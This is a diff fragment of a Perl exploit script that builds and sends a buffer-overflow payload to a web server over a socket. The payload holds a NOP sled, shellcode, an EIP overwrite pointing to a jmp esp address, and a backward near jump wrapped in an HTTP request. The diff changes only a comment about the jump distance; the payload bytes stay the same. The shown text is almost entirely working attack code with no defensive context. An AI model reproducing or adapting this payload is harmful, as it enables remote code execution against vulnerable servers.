@@ -54,7 +54,7 @@ $payload = "\x90"x$dist; # Distance to overwrite EIP
 $payload.=$shellcode;
 $payload.="\x90" x 8; #Spacer between EIP and shellcode
 $payload.= "\x53\x93\x42\x7e"; #Overwrite EIP with jmp esp
-$payload.="\x90\x90\x90\x90\xE9\xF4\xFC\xFF\xFF"; #stack padding + BP + Near jmp-300
+$payload.="\x90\x90\x90\x90\xE9\xF4\xFC\xFF\xFF"; #stack padding + BP + Near jmp-780
 $payload.=" / HTTP/1.0\r\n\r\n"; # Needs to be a valid HTTP request
 
 print $sock $payload;
